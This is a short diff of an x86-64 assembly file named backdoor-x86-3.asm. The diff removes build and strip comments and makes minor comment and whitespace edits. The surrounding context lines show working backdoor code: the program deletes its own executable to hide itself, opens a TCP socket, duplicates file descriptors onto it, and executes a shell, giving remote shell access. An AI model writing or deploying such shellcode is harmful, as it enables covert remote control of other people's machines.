@@ -1,8 +1,6 @@
 	global _start
 	
 _start:
-	;; $ nasm -f elf64 -o backdoor-x86-3.o backdoor-x86-3.asm && ld -o backdoor-x86-3 backdoor-x86-3.o
-	;; $ sstrip backdoor-x86-3
 
 	;; unlink argv[0]
 	mov rdi, [rsp + 8]
@@ -21,7 +19,7 @@ _start:
 	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
 	mov edi, 2		; PF_INET 2
 	mov esi, 1		; SOCK_STREAM
-	mov edx, 6              ; IPPROTO_TCP
+	mov edx, 6      ; IPPROTO_TCP
 	xor eax,eax
 	add al, 41
 	syscall
@@ -43,7 +41,7 @@ _start:
 	inc rsi
 	call _dup2
 	
-	;; Exec
+	;; Execve
  	lea rdi, [rel shell]
 	xor rsi,rsi
 	xor rdx,rdx
